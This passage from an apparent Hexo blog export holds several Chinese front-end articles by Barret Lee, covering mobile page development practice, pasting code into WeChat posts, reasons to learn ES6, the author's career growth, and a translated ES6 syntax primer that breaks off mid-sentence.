    <content type="text"><![CDATA[当我们沉浸在旺盛的需求之中时，整个人便会成为一台工作的机器，切着类似的页面，写着同样的逻辑，重复着昨天或者上个月做的事情，时间久了，觉得腻味，没有什么创新，也没有明显的成长。用一句通俗的话来讲：工作五年，后面四年重复着第一年的活儿。 很多人尝试跳出这个怪圈，不过基于环境压力和思维受阻，最后又不得不选择放弃。今天想通过介绍如何高效有保障地开发一个无线页面来帮助大家找到突破口。 日常开发状态很多无线页面的开发有两种模式，一种是后台输出 JSON 数据，前端根据数据来渲染页面（同步模式）；第二种是前端异步加载后端数据然后渲染（异步模式）。当然，两种模式夹杂在一起也是存在的，这种情况一般会有一个由前端控制的中间层提供同步数据和异步数据。为了减少前后端的沟通成本，往往采用第二种模式。 拿到设计稿后，与后端同学约定接口格式，让后端同学尽快提供 mock 数据，如果提供不了，便自己构造测试数据。接着回到自己的工位上切图，切图过程中会解决好响应式问题和兼容性问题，待到后端产出真实数据时，更换 JS 中的接口地址，联调 ok 便发布页面，大功告成！ 整个流程很顺畅，这对一个工作了三四年的程序员来说，没有任何压力便完成甚至提前完成了任务。但是，回过头来想一想，整个开发过程中我们留下了什么？沉淀了什么？ 放慢节奏，我们再走一遍流程对于上面的开发流程，先提出几个常见的问题： 你是如何良好处理大、中、小等各型号手机的适配问题的？Media Query？等比布局？ 模块如何渲染，模板和接口数据如何拼装？字符串拼接？正则替换？模板引擎？ 本地、预发和线上三套环境，如何进行无痕切换？ 如果开发时接口有变动，线上数据暂未产出，本地 mock 接口如何快速响应？ 如何解决异步 JSONP 接口的安全问题？JSONP 接口请求异常、超时、失败等情况如何处理？ 页面中的 Slide 和 Tab 逻辑如何写？复制之前写过的代码？找一个好用的组件？ 图片的懒加载处理如何控制？脚本的懒执行如何控制？ 首屏加载页面空白体验如何优化？ 页面回退 Session 和 Token 失效如何处理？ … 上面提出的几个问题，列的不全面。有一些可能是你经常碰到的，甚至有了成熟的解决方案，而也有一些问题可能是你从未考虑过的。 我们把整个前端开发流程做简单切割：切图、获取数据、渲染、事件绑定、数据统计、页面优化、监控。这种切割很暴力，也比较粗糙，不过它不妨碍我们在下面讨论，作为前端工程师，除了完成日常需求外，还要做什么？还能做什么？ 切图隐约还记得三年前，我接了一个无线页面的外包活儿，页面的结构很简单，但我做的很糟糕。为了适配不同尺寸的机型，我写了无数 Media Query，加上当时采用的 em 作单位，很多细节位置都没控制好。 回到现在，已经有了很通用、主流的方案——使用 rem，动态计算 html 标签的 font-size，思路很简单，但是存在不少的坑，和一些较难理解的概念，Google 搜索下 lib-flexible 能够找到这些问题以及解决方案。不过我们切图时还可以思考一些其他的问题： 各类静态资源（image/css/js/font）如何放置？新建各种文件夹？ 是否还是修改代码再刷新页面的调试手段？考虑过 liveload？ CSS 复用率如何？跨项目的复用率呢？使用预处理语言封装基类？ 还在心算从 px 折算为 rem？用计算器算？ 身旁放 20 台机器测试页面兼容性？ 以上问题，没有哪一个会让人特别苦恼，但是堆积起来，却让我们的开发效率和开发体验落后了好几个档次。这些问题并非无解，我们可以尝试着帮助同事和团队找到问题的答案，比如： 统一团队的本地构建环境，初始化一个工程目录的脚手架 统一打包脚本，实时编译和预览 封装预处理基类，屏蔽 rem 计算，比如编译时自动转换 px 为 rem 构建云测平台，云端测试各种机型兼容性，打开网页输入网址即可批量测试 有些解决方案只需要几行脚本就能搞定，而有一些可能需要投入时间和精力。 获取数据本地、预发、线上三套环境，如何做到环境的顺滑切换？我在百度的时候，团队最常用的方案就是： 线上测试，本地反向代理到预发或者线上环境； 本地测试，则使用 apache 开启服务提供 mock 接口 可一旦与后端约定的接口有变动，本地 mock 数据也要跟着一起变动。这个问题有什么好的处理方案？在团队中，好的方案一定不是几行文字的提示或指引，而是通过流程和监控来控制！ 这里提到的获取数据，细想之下可不是什么轻松的事情。有很多问题需要思考： 如何保障 JSONP 数据的安全问题？refer 限制？token 验证？ 数据来源很多，如何减少页面的请求数量？让后端合并数据？如果是多个团队提供数据呢？ 如何控制需求变化导致的接口格式变化？ 如何处理接口的不稳定问题？ 如何处理超时问题？ 如何产生容灾数据？如何获取容灾数据？ 如何控制数据缓存？如前端控制缓存一分钟？ 如何对接口做监控？ 如何减少数据的重复请求问题？ 以上每个问题都有很多处理方案，而这些问题不仅仅是自己会遇到，身边的同事也会遇到。如果可以站在团队的角度去思考问题，很多思路会比较容易涌现出来，比如： 构建一个平台，用于接口格式约定，通过约定好的格式，系统自动生成 mock 数据，用于本地开发，后端也必须遵循这个接口约定，任何接口的变动，mock 数据自动变动 构建一个平台，让不规范的数据进入这个平台，规范化输出，前端只考虑规范化的接口提示和解析，同时该平台产出数据的备份接口 前端添加一个请求 Hub，当页面有很多请求出来时，合并请求统一发出，当数据回来时，统一储存和过滤 数据是最容易出问题的地方，每一个接口请求都需要一大堆的逻辑处理异常。倘若接口格式、开发流程和前端模式都可以规范化，我们需要做的就剩下套公式，这种高效你能否想象？ 渲染大胆地揣测下大家在写一个模块的时候，跟我一样也是这么划分的函数： 1234567891011121314151617181920212223242526272829303132333435363738394041424344var Module = function() &#123; this.init();&#125;;// 初始化Module.prototype.init = function() &#123; this.fetchData(function() &#123; // do something &#125;);&#125;;// 绑定事件Module.prototype.bindEvent = function() &#123; // ...&#125;;// 获取数据Module.prototype.fetchData = function(cb) &#123; var self = this; ajax(&#123;&#125;).then(function(data) &#123; self.renderData(data); &#125;).catch(function() &#123; self._fetchDataFailed(); &#125;).fin(function() &#123; cb &amp;&amp; cb(); &#125;);&#125;;// 渲染数据Module.prototype.renderData = function(data) &#123; data = this._resolveData(data); // ... this.bindEvent();&#125;;// 处理数据Module.prototype._resolveData = function() &#123; // ...&#125;;// 加载失败Module.prototype._fetchDataFailed = function() &#123; // ...&#125;; 不管一个模块有多么简单，它基本都会包含以上步骤，倘若没有用函数隔离每步操作的意图，代码会显得十分散乱。我经常看到，有同学把「渲染」这一块的代码被放到「获取数据」甚至是「初始化」中，这种程序结构显然是不合理的。同时，也经常会看到渲染时， 在代码中写大量的字符串模板 写一个工具函数，解析字符串模块中的循环逻辑 使用 replace 函数正则替换字符串变量 使用 innerHTML 函数插入拼装好的字符串 在渲染模块中添加大量逻辑 以上，没有哪一种是不正确的，我也没有对哪一种写法开喷的意图。但是至少我们可以在多次编程经验中提炼出一些有价值的内容： 团队统一的模板引擎，并且提供模块的离线编译，提高线上运行效率 提供安全机制，保障插入的数据不会产生安全问题 严格编程范式，分离视图和逻辑层，把数据处理好了再送入模板 有一个可执行的编码规范，加上适当合理的 Code Review，整个团队代码便会如出一辙。 后续操作本想写成一篇长文，把每个环节可以综合考虑的问题都提出来，不过本文的目的，只是表述一些观点，期望大家在编程的时候，有更多基于团队的思考，针对具体问题提出一些通用的解决方案。比如下面，再提出几个问题： 首屏加载白屏问题，如何处理？本地缓存？等待提示？假数据？同步输出？ 如何减少页面的请求？资源内敛？如何做到自动内敛所有的资源？ 页面报错的统计如何做？做了之后如何分析？分析之后如何推动线上错误减少？ 页面发布时如何自动回归检测？点下链接看看是否 404？打开控制台看看是否有报错？滚屏看看图片是否加载正确？ … 以上问题，都有相当成熟的解决方案，那你们团队呢？ 小结当发现工作做起来索然无味的时候，我脑海中蹦出来的第一个念头是：最近是不是有点放纵了？ 我喜欢用编程解决问题，只要是重复的事情，我一定会想尽办法简化，然后交给机器去做。我希望今年可以用程序解决更多的问题。]]></content>
      <categories>
        <category>前端杂烩</category>
        <category>观点和感想</category>
      </categories>
      <tags>
        <tag>前端</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[向小胡子哥提问]]></title>
    <url>%2Fblog%2F2016%2F07%2F14%2F2016-07-14-question-and-answer%2F</url>
    <content type="text"><![CDATA[欢迎向小胡子哥提问，由于个人精力有限，并不是每一个问题都会去回答。 如果你期望看到我的回答，可以把问题整理好，通过邮箱或者留言方式发给我： 邮箱地址：barret.china@gmail.com 留言地址：http://www.barretlee.com/message/ 只要你的问题是完整的、网上搜索不到满意答案的，并且在我能够回答范围之内，我都会认真作答。 对于询问「如何入门」、「如何成长」之类的问题，我可能不会单独回答，而是写一个 PPT、或者一篇文章来阐述我的观点。 十分期望提问的同学能够学会使用搜索引擎。]]></content>
      <categories>
        <category>随笔</category>
        <category>笔记本</category>
      </categories>
      <tags>
        <tag>提问</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[在公众号中优雅地呈现代码]]></title>
    <url>%2Fblog%2F2016%2F07%2F14%2F2016-07-14-codes-in-wechat%2F</url>
    <content type="text"><![CDATA[下文不用看了，直接戳这里吧：http://md.barretlee.com/，我开发了一个在线工具。 这几天有不少朋友在我的微信公众号留言，问我是如何在公众号页面中整齐摆放代码的，今天就分享下我的方法，事实上我也折腾了好一会儿。 长话短说 Markdown 解释器在转换代码片段时，没有在换行的时候添加 &lt;br&gt; 标签，而是直接输出一个换行符 \n，微信编辑页在保存或者预览时，将部分换行符给过滤了。 下文主要讲的是很多公众号维护者遇到的代码展示问题，以及处理这些问题的几个思路。 自动批量将代码转为图片观察了很多技术类公众号，绝大多数为了保证良好可视效果，直接采用代码截图，这种做法很简洁，但也存在几个问题： 需要人肉截图和上传图片，对公众号维护者来说很麻烦 页面中代码截图太多，也影响阅读，尤其是弱网下的读者 截图控制不好，会出现多余内边距，或者因为尺寸问题，不得已做缩放处理 以上对维护者和用户来说，都是很不爽的，如果一定要使用图片，我倒是建议维护者开发一个组件，将页面中的代码段自动转为图片，思路如下： 将代码片段渲染出来，使用 highlight.js 高亮代码 将高亮的代码绘制到 canvas 中 导出 base64 图片，或者通过 a[download] 将图片下载下来保存到本地 之前月影姐姐开发了一个 code-to-image，感兴趣的同学可以去 github 上搜索下。 我有考虑过写这个程序，不过后来找到了一个更加有用的办法。 Markdown HereMarkdown Here 是一款 Chrome 插件，顾名思义，就是将你写的 Markdown 直接转为 HTML 代码，我做了一个演示图片： 图中的编辑框并不是一个 textarea 控件，试想下这个控件中怎么玩也玩不出渲染好的 HTML 代码来，事实上，它是一个可编辑的普通元素，即加了一个 contenteditable 属性，你可以按照下面的步骤测试下： 打开一个新的 Tab URL 中输入：data:text/html,&lt;html contenteditable&gt; 然后去一个网页中全选所有内容，在上面的 URL 页面中粘贴 是不是把粘贴的内容是具备样式的？再用 Chrome Devtools 看看每个元素，你会发现，原来的样式被继承下来并且作为内敛样式嵌入。 微信公众号的编辑框也是 contenteditable 的，所以你可以通过 Markdown Here 插件将 Markdown 文本直接转换为代码。只可惜，可是在点击保存和预览的时候，内容又被微信的脚本重新解析了一次，过滤了部分内敛属性，一些转行符也被它给忽略了，如下在微信编辑框中展示正常的代码： 在点击预览后，展示效果为： 变成一行了，原因是代码中部分转行符号被过滤掉了。 处理办法可以通过几行正则，将 Markdown 转换的源码做小小的修改，部分换行符 \n 替换成 &lt;br&gt; 标签就行了。我的个人博客采用的是 hexo 构建的，它渲染出来的代码在换行处已经有了换行标签： 把博客代码直接粘贴过来的效果是： 12345function syntaxHighlighting() &#123; var n = 33; var s = "hello, こんにちは"; console.log(s);&#125; 是不是感觉还不错？那么，写正则替换微信编辑器渲染源码，修复过滤换行符问题这么神圣的事情，就交给读者了！]]></content>
      <categories>
        <category>工具</category>
        <category>前端杂烩</category>
      </categories>
      <tags>
        <tag>微信公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[我需要学习 ECMAScript 6 么？]]></title>
    <url>%2Fblog%2F2016%2F07%2F13%2F2016-07-13-why-i-learning-es6%2F</url>
    <content type="text"><![CDATA[前几天翻译了一篇 ECMAScript 6 的入门文章，看到几则评论说 JavaScript 越来越像 Java 了，我暗暗地笑了笑。也有同学很疑惑是否有必要学习 ES6，使用 TypeScript 的同学也有类似的疑惑。 记得之前 winter 在微博上说，不要对知识存在偏见性，人家吵架说什么什么东西不要学，千万千万别信，但是他们吵架时提到的知识点，记得赶紧收进口袋装好。那么，ES6 这个话题呢？你是否对这个话题存在偏见性？ ES6 历史简述ECMAScript 6，很多地方称之为 ECMAScript 2015，从老外们的博客来看，貌似更倾向于后面的叫法，这个并不重要。 ECMAScript 是一个标准，从 1.0 发展至今，目前已经进入 ES7 草案阶段，其中有两个版本是我们熟知的，ECMAScript 3.1 和 ECMAScript 5.0，旧版的 IE 实现都是基于 3.1 规范，而 IE9 以后及现代浏览器基本都依照 ES5.0 规范。 标准的每个版本都会经历多个阶段：提案、草案、标准、实验性、文档和历史标准。其中 Draft/REC/RFC 三种状态是阅读规范是最常看到的，到了 RFC 的文档基本就不会再变化了，后续的变化会提到下一个版本的提案或草案中。 ES6 讲述了什么？阅读 ES6 文档，最直观的感受是，它更加灵活了。矫正了 ES5.0 很多模棱两可的写法（事实上 ES5.0 的 strict 模式就已经很严格了）；同时在基础对象上扩展了很多工具函数，这一扩充基本让我们告别了 prototype/undescore 等类库，并且它还加强了对 UTF-16 的支持；同时增加了大型工程下编程的语法支持，如 Class/Module/Import/Decorator 等语法。 ES6 不希望语言本身对编程有限制，也不希望模糊不清的写法迷惑编程人员。而在添加很多语法糖之后，CoffeeScript 和 TypeScript 就略显多余了，两种预处理语言刚出来的时候，我也花了很多功夫去学习，并且尝试去适应。而现在，ES6 作为一种标准出现在我们眼前，我已经不能说服自己再使用其他预处理语言编写 JS 代码了。 我需要学习 ES6 么？这个问题，还是让代码来回答吧： 123456789101112131415161718192021222324252627import Baz from 'bazGroup';class Foo extends Baz &#123; static classMethod() &#123; return 'hello'; &#125; constructor(...args) &#123; this.args = args; &#125; * [Symbol.iterator]() &#123; for (let arg of this.args) &#123; yield arg; &#125; &#125;&#125;class Bar extends Foo &#123; static classMethod() &#123; return super.classMethod() + ', too'; &#125;&#125;Bar.classMethod();for (let x of new Foo('hello', 'world')) &#123; console.log(x);&#125; 上面这串代码，你还能够完整理解么？ ECMAScript 2015 是一种标准，而且各个浏览器厂商都相当踊跃地遵循这个标准，目前 Chrome 已经支持了将近 80%+ 的 ES6 特性，业界流行框架类库都开始使用 ES6 编写，很多大小公司也开始玩弄起这个标准。不说别的原因，这类代码放到你眼前，你是否读得懂？ 所以，ES6 需要学习么？毫无疑问呀😜]]></content>
      <categories>
        <category>前端杂烩</category>
        <category>JavaScript</category>
      </categories>
      <tags>
        <tag>JavaScript</tag>
        <tag>ECMAScript</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[谈谈我这三年在技术上的成长]]></title>
    <url>%2Fblog%2F2016%2F07%2F11%2F2016-07-11-learning-recent-years%2F</url>
    <content type="text"><![CDATA[前些时候把微信 id 开放了出去，有很多朋友加我微信，其中大部分都是前端学习者。一些同学在学习的时候遇到了困难，或者说瓶颈吧，询问我处理办法，有的希望我讲述下学习经验。考虑到有些话题偏大，我没有详细回复，事实上我也不知道从何说起，今天思量了一番，记录下来。 前些天写了一篇文章 《谈一谈越来越难做的前端》，谈了一下前端职能的变化，前端圈子越变越大，能做的事情也越来越多，于是可以选择的方向也多了起来。新名词、新技术接二连三跳串出来完全不给人喘息的机会，上一波没有学明白下一波甚至第三波就来了，很多人开始迷失在技术名词之中。而且每天对着同样的人做着同样的活儿，看不到自己的成长，也不知道如何成长。 我在 14 年 7 月 14 号正式入职淘宝，之前分别在百度和淘宝实习了三个月，两次实习让我成长了很多，而正式入职后在淘宝的两年更让我受益匪浅。一个人成长最快的时候，是他适应新环境的那段时间。 扎实的基础记得第一次面试之前，我很努力地把所知道的前端相关的技术点列了列，写了好几页纸的关键词，然后针对每个关键词系统地巩固学习，解决心中的疑问以及学习时遇到的新疑问，然后自信满满地参加了新浪和网易的面试。那时候，估计两家公司的前端工程化已经有些苗头了，但可能认为学校里的同学没啥实战经验，主要问的都是前端基础题，闭包、正则、DOM 模型、Event 模型等等，没什么特别深入的话题。当然，那时候我的简历中也没有太多体现工程化相关的内容，估计跟面试官也聊不起来。 对于入门不久的前端同学，面试官着重考虑的是他们的学习能力、发展潜力，也会适当看看编程能力过不过关，对 JavaScript/CSS/HTML 的基础知识掌握的牢不牢固。如果你被面试官选中了，那就说明，你具有较强的综合素养，是一个合格的前端入门者。一般重点高校学生的学习能力都还不错，大学几门计算机相关学科的薰陶加上适当的课外练习后，编程能力也是能够接受的，所以公司喜欢招聘重点高校尤其是偏理工科的学生。我看到不少同学，在毕业前三五个月才开始了解和学习前端，单最后都顺利地进入 BAT。 我就属于上面这波人，只不过，不是毕业前抱佛脚，而是较早地接触了前端，看了很多书籍，融入了前端社区，并且在学校的技术团队中锻炼了基本功。我很庆幸自己会在大学时，投入那么多时间在前端基础知识的学习上，因为毕业后我发现，自己已经没有那么多时间和耐心来学习这些略感枯燥的知识了。已经工作的你还能够坚持一口气啃完犀牛书么？估计绝大多数人都没这个耐心吧，即便有些知识你已经淡忘了，只愿意把犀牛书作为工具书。我在毕业前就把这本书啃了四五遍，现在基本不需要这本工具书了。 大学期间读过的书很多，豆瓣上记录过 大学读的书，从每本书都吸收点知识，所以总的知识储备其实是足够应付面试和一般需求的。不谦虚地说，我对前端硬知识的了解比较全面，这对我后续的提升奠定了坚实的基础。 知识体系和能力阶梯但是，毕业工作后，才发现，我学的那点东西远远不够。事实上，毕业之前的实习就深有体会了。 为什么公司期望学生能够去实习？公司有自己的一套流程和技术体系，这一套东西是适配公司业务，方便各个工种之间协同作战的，而且每个公司的那一套都不太一样。刚毕业的同学最熟练的是对 API 的使用，而进入一个新环境后，会发现之前熟悉的那一套并不好使，有很多软件环境需要搭建，很多框架类库需要熟悉，还有一堆开发流程、上线流程、业务流程等等，这些东西会让一个自信的新人变得没有任何优越感。再加上分配的业务上还有几个小 bug 要修理，你几乎不会有自己的时间，学习变得变成了一种奢侈的事情。这也是给还在学校的同学一个警示，如果你要走技术这条路，基本功一定要打扎实，否则工作第一年你会相当吃力。 百度实习那几个月对我的改变很大，象牙塔外拼搏三个月，个人阅历见长且不说，技术上的认识有了很大幅度的提升。当然，这要感谢公司。在公司里很容易知道哪些技术是公司需要的，哪些技能是业务中必须熟练掌握的。慢慢的，对技术就有了一定的甄别能力，曾经摆在心中的技术关键词是单线程、兼容性、冒泡捕获、事件代理等等，而现在变成了组件化、调试模式、自动化测试、前端集成环境等等，完全是两个知识维度上的分类。 公司有不同层级的人，他们做的事情也有些差异，从这些差异中也能够体会出，自己跟这群人相比亮点和缺点分别是什么，如果需要提升还需要做些什么。越大的公司，对人能力的分级越明显，对个人来讲，也越容易找准自己的位置。知道自己水平在什么位置，也知道下一个水平在什么位置之后，我们需要的就只有努力了。 业务和新技术我从来不担心社区又出来几个什么新的技术名词，因为我已经给这些词安排了座位，就在脑海中。比如 grunt、gulp、webpack 等名词出来的时候，我没有忙着去深入学习，脑子里有一张大概的体系图，先把它们打包扔到脑子里命名为“工程化-打包类”，先存起来，等到需要的时候再去学习。实际上，我也是隔了三四个月才去学习和使用他们的。 但是存进大脑之前，我会先简单了解这些工具：它能做什么？哪些场景可以用？大概如何用？社区在哪里？组件库如何搜索？三者之间的差异是什么？然后看看基本的 API，这些工作花不了多少时间，但是对我后续深入了解它们提供了很大的帮助。我一直很认可这句话：「知道从哪里可以学到知识，就就学会了这个知识的一半」。 所以我不担心有新技术出来，我不忙着学它，因为即便是我学会了，我的团队中也不会去用它，甚至业务中根本就用不上。对新知识做分类并且了解全貌，至于细节部分嘛，先放放。不要动不动就搞什么源码分析，React 的 diff 算法，Vue 的 MVVM，这种事情费事费力，其实稍微想象下就知道是个啥了么，中间的细节实现和实现原理不是不重要，而是暂时不重要。可以等到你闲下来或者预知业务中有需要时，再下工夫深入也不迟。 大多数情况下，技术都是跟着需求的变化而变化的，需求从哪里来？当然是从你的团队和业务之中出来的。跟着业务走，你的方向不会错！ 小结可以说没有人系统地学过前端，大学没这门课，公司也没这门课。前端这个词是 ajax 流行时出现，它朝气蓬勃，发展却异常迅猛。要在技术这条路上走的长久，首先要把基础打扎实，然后才能能力和闲工夫循序渐进。 好吧，希望这篇文章对你有所启发，下次我再分享我是怎么建立自己的知识体系的。]]></content>
      <categories>
        <category>前端杂烩</category>
        <category>观点和感想</category>
      </categories>
      <tags>
        <tag>成长</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ECMAScript 6 扫盲]]></title>
    <url>%2Fblog%2F2016%2F07%2F09%2F2016-07-09-a-kickstarter-guide-to-writing-es6%2F</url>
    <content type="text"><![CDATA[ECMAScript 6 目前基本成为业界标准，它的普及速度比 ES5 要快很多，主要原因是现代浏览器对 ES6 的支持相当迅速，尤其是 Chrome 和 Firefox 浏览器，已经支持 ES6 中绝大多数的特性。 本文译自 Github 上的一篇文章，目的是对还不太熟悉 ES6 语法的同学做一个简单的扫盲。 1. let、const 和 block 作用域let 允许创建块级作用域，ES6 推荐在函数中使用 let 定义变量，而非 var： 123456var a = 2;&#123; let a = 3; console.log(a); // 3&#125;console.log(a); // 2 同样在块级作用域有效的另一个变量声明方式是 const，它可以声明一个常量。ES6 中，const 声明的常量类似于指针，它指向某个引用，也就是说这个「常量」并非一成不变的，如： 123456&#123; const ARR = [5,6]; ARR.push(7); console.log(ARR); // [5,6,7] ARR = 10; // TypeError&#125; 有几个点需要注意： let 关键词声明的变量不具备变量提升（hoisting）特性 let 和 const 声明只在最靠近的一个块中（花括号内）有效 当使用常量 const 声明时，请使用大写变量，如：CAPITAL_CASING const 在声明时必须被赋值 2. 箭头函数（Arrow Functions）ES6 中，箭头函数就是函数的一种简写形式，使用括号包裹参数，跟随一个 =&gt;，紧接着是函数体： 123456var getPrice = function() &#123; return 4.55;&#125;;// Implementation with Arrow Functionvar getPrice = () =&gt; 4.55; 需要注意的是，上面栗子中的 getPrice 箭头函数采用了简洁函数体，它不需要 reture 语句，下面这个栗子使用的是正常函数体： 1234567let arr = ['apple', 'banana', 'orange'];let breakfast = arr.map(fruit =&gt; &#123; return fruit + 's';&#125;);console.log(breakfast); // apples bananas oranges 当然，箭头函数不仅仅是让代码变得简洁，函数中 this 总是绑定总是指向对象自身。具体可以看看下面几个栗子： 123456789function Person() &#123; this.age = 0; setInterval(function growUp() &#123; // 在非严格模式下，growUp() 函数的 this 指向 window 对象 this.age++; &#125;, 1000);&#125;var person = new Person(); 我们经常需要使用一个变量来保存 this，然后在 growUp 函数中引用： 12345678function Person() &#123; var self = this; self.age = 0; setInterval(function growUp() &#123; self.age++; &#125;, 1000);&#125; 而使用箭头函数可以省却这个麻烦： 12345678910function Person()&#123; this.age = 0; setInterval(() =&gt; &#123; // |this| 指向 person 对象 this.age++; &#125;, 1000);&#125;var person = new Person(); 在 这里 可以阅读更多 this 在箭头函数中的词法特性。 3. 函数参数默认值ES6 中允许你对函数参数设置默认值： 12let getFinalPrice = (price, tax=0.7) =&gt; price + price * tax;getFinalPrice(500); // 850 4. Spread / Rest 操作符Spread / Rest 操作符指的是 ...，具体是 Spread 还是 Rest 需要看上下文语境。 当被用于迭代器中时，它是一个 Spread 操作符： 123456function foo(x,y,z) &#123; console.log(x,y,z);&#125;let arr = [1,2,3];foo(...arr); // 1 2 3 当被用于函数传参时，是一个 Rest 操作符： 1234function foo(...args) &#123; console.log(args);&#125;foo( 1, 2, 3, 4, 5); // [1, 2, 3, 4, 5] 5. 对象词法扩展ES6 允许声明在对象字面量时使用简写语法，来初始化属性变量和函数的定义方法，并且允许在对象属性中进行计算操作： 1234567891011121314151617181920212223242526function getCar(make, model, value) &#123; return &#123; // 简写变量 make, // 等同于 make: make model, // 等同于 model: model value, // 等同于 value: value // 属性可以使用表达式计算值 ['make' + make]: true, // 忽略 `function` 关键词简写对象函数 depreciate() &#123; this.value -= 2500; &#125; &#125;;&#125;let car = getCar('Barret', 'Lee', 40000);// output: &#123;// make: 'Barret',// model:'Lee',// value: 40000,// makeBarret: true,// depreciate: function()// &#125; 6. 二进制和八进制字面量ES6 支持二进制和八进制的字面量，通过在数字前面添加 0o 或者 0O 即可将其转换为二进制值： 12345let oValue = 0o10;console.log(oValue); // 8let bValue = 0b10; // 二进制使用 `0b` 或者 `0B`console.log(bValue); // 2 7. 对象和数组解构解构可以避免在对象赋值时产生中间变量： 1234567891011121314151617function foo() &#123; return [1,2,3];&#125;let arr = foo(); // [1,2,3]let [a, b, c] = foo();console.log(a, b, c); // 1 2 3function bar() &#123; return &#123; x: 4, y: 5, z: 6 &#125;;&#125;let &#123;x: x, y: y, z: z&#125; = bar();console.log(x, y, z); // 4 5 6 8. 对象超类ES6 允许在对象中使用 super 方法： 12345678910111213141516var parent = &#123; foo() &#123; console.log("Hello from the Parent"); &#125;&#125;var child = &#123; foo() &#123; super.foo(); console.log("Hello from the Child"); &#125;&#125;Object.setPrototypeOf(child, parent);child.foo(); // Hello from the Parent // Hello from the Child 9. 模板语法和分隔符ES6 中有一种十分简洁的方法组装一堆字符串和变量。 ${ ... } 用来渲染一个变量 ` 作为分隔符 12let user = 'Barret';console.log(`Hi $&#123;user&#125;!`); // Hi Barret! 10. for...of VS for...infor...of 用于遍历一个迭代器，如数组： 123456let nicknames = ['di', 'boo', 'punkeye'];nicknames.size = 3;for (let nickname of nicknames) &#123; console.log(nickname);&#125;Result: di, boo, punkeye for...in 用来遍历对象中的属性： 123456let nicknames = ['di', 'boo', 'punkeye'];nicknames.size = 3;for (let nickname in nicknames) &#123; console.log(nickname);&#125;Result: 0, 1, 2, size 11. Map 和 WeakMapES6 中两种新的数据结构集：Map 和 WeakMap。事实上每个对象都可以看作是一个 Map。 一个对象由多个 key-val 对构成，在 Map 中，任何类型都可以作为对象的 key，如： 1234567891011121314151617var myMap = new Map();var keyString = "a string", keyObj = &#123;&#125;, keyFunc = function () &#123;&#125;;// 设置值myMap.set(keyString, "value 与 'a string' 关联");myMap.set(keyObj, "value 与 keyObj 关联");myMap.set(keyFunc, "value 与 keyFunc 关联");myMap.size; // 3// 获取值myMap.get(keyString); // "value 与 'a string' 关联"myMap.get(keyObj); // "value 与 keyObj 关联"myMap.get(keyFunc); // "value 与 keyFunc 关联" WeakMap WeakMap 就是一个 Map，只不过它的所有 key 都是弱引用，意思就是 WeakMap 中的东西垃圾回收时不考虑，使用它不用担心内存泄漏问题。 另一个需要注意的点是，WeakMap 的所有 key 必须是对象。它只有四个方法 delete(key),has(key),get(key) 和 set(key, val)： 1234567891011121314151617let w = new WeakMap();w.set('a', 'b'); // Uncaught TypeError: Invalid value used as weak map keyvar o1 = &#123;&#125;, o2 = function()&#123;&#125;, o3 = window;w.set(o1, 37);w.set(o2, "azerty");w.set(o3, undefined);w.get(o3); // undefined, because that is the set valuew.has(o1); // truew.delete(o1);w.has(o1); // false 12. Set 和 WeakSetSet 对象是一组不重复的值，重复的值将被忽略，值类型可以是原始类型和引用类型： 12345let mySet = new Set([1, 1, 2, 2, 3, 3]);mySet.size; // 3mySet.has(1); // truemySet.add('strings');mySet.add(&#123; a: 1, b:2 &#125;); 可以通过 forEach 和 for...of 来遍历 Set 对象： 1234567891011121314151617mySet.forEach((item) =&gt; &#123; console.log(item); // 1 // 2 // 3 // 'strings' // Object &#123; a: 1, b: 2 &#125;&#125;);for (let value of mySet) &#123; console.log(value); // 1 // 2 // 3 // 'strings' // Object &#123; a: 1, b: 2 &#125;&#125; Set 同样有 delete() 和 clear() 方法。 WeakSet 类似于 WeakMap，WeakSet 对象可以让你在一个集合中保存对象的弱引用，在 WeakSet 中的对象只允许出现一次： 123456789101112var ws = new WeakSet();var obj = &#123;&#125;;var foo = &#123;&#125;;ws.add(window);ws.add(obj);ws.has(window); // truews.has(foo); // false, foo 没有添加成功ws.delete(window); // 从结合中删除 window 对象ws.has(window); // false, window 对象已经被删除 13. 类ES6 中有 class 语法。值得注意是，这里的 class 不是新的对象继承模型，它只是原型链的语法糖表现形式。 函数中使用 static 关键词定义构造函数的的方法和属性： 123456789101112131415161718class Task &#123; constructor() &#123; console.log("task instantiated!"); &#125; showId() &#123; console.log(23); &#125; static loadAll() &#123; console.log("Loading all tasks.."); &#125;&#125;console.log(typeof Task); // functionlet task = new Task(); // "task instantiated!"task.showId(); // 23Task.loadAll(); // "Loading all tasks.." 类中的继承和超集： 12345678910111213141516class Car &#123; constructor() &#123; console.log("Creating a new car"); &#125;&#125;class Porsche extends Car &#123; constructor() &#123; super(); console.log("Creating Porsche"); &#125;&#125;let c = new Porsche();// Creating a new car// Creating Porsche extends 允许一个子类继承父类，需要注意的是，子类的 constructor 函数中需要执行 super() 函数。 当然，你也可以在子类方法中调用父类的方法，如 super.parentMethodName()。 在 这里 阅读更多关于类的介绍。 有几点值得注意的是： 类的声明不会提升（hoisting)，如果你要使用某个 Class，那你必须在使用之前定义它，否则会抛出一个 ReferenceError 的错误 在类中定义函数不需要使用 function 关键词 14. SymbolSymbol 是一种新的数据类型，它的值是唯一的，不可变的。ES6 中提出 symbol 的目的是为了生成一个唯一的标识符，不过你访问不到这个标识符： 12var sym = Symbol( "some optional description" );console.log(typeof sym); // symbol 注意，这里 Symbol 前面不能使用 new 操作符。 如果它被用作一个对象的属性，那么这个属性会是不可枚举的： 123456var o = &#123; val: 10, [ Symbol("random") ]: "I'm a symbol",&#125;;console.log(Object.getOwnPropertyNames(o)); // val 如果要获取对象 symbol 属性，需要使用 Object.getOwnPropertySymbols(o)。 15. 迭代器（Iterators）迭代器允许每次访问数据集合的一个元素，当指针指向数据集合最后一个元素是，迭代器便会退出。它提供了 next() 函数来遍历一个序列，这个方法返回一个包含 done 和 value 属性的对象。 ES6 中可以通过 Symbol.iterator 给对象设置默认的遍历器，无论什么时候对象需要被遍历，执行它的 @@iterator 方法便可以返回一个用于获取值的迭代器。 数组默认就是一个迭代器： 12345678var arr = [11,12,13];var itr = arr[Symbol.iterator]();itr.next(); // &#123; value: 11, done: false &#125;itr.next(); // &#123; value: 12, done: false &#125;itr.next(); // &#123; value: 13, done: false &#125;itr.next(); // &#123; value: undefined, done: true &#125; 你可以通过 [Symbol.iterator]() 